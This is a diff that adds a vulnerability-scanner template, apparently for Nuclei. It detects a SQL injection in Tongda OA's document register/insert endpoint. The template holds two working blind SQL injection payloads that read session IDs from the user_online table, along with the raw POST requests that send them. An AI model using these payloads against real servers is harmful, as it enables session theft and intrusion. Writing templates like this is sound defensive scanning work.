@@ -1,0 +1,49 @@
+id: CVD-2021-10871
+info:
+  name: Tongda OA SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tongda OA (Office Anywhere network intelligent office system) has an SQL injection vulnerability in the register/insert SQL functionality, which may cause data leakage or server compromise.
+  reference:
+    - https://mp.weixin.qq.com/s/zH13q6xBRc58ggHqfKKi_g
+  tags: sql-injection
+
+variables:
+  payload_1: "title)values(\"'\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),26,1))>1,1,710)))# =1&_SERVER="
+  payload_2: "title)values(\"'\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),27,1))>1,1,710)))# =1&_SERVER="
+
+http:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{payload_1}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "recv/register"
+
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{payload_2}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "var MYOA_JS_SERVER = \"\";"
